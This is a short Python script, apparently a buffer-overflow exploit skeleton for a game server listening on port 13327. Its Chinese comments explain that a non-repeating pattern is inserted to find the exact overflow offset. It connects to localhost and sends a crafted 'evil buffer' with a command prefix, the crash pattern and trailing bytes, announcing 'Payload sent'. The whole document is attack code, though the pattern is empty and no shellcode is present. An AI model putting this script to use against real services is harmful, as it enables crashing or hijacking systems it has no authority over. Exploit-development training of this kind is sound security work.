import socket
host = "127.0.0.1"
crash = ""  #crash的值是大量的不重复的字母数字组合用于精确确定位置
buffer = "\x11(setup sound" + crash + "\x90\x00#"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("[*]Sending evil buffer...")
s.connect((host, 13327))   #host后面是连接的端口号
data = s.recv(1024)
print(data)
s.send(buffer)
s.close()
print("[*]Payload sent")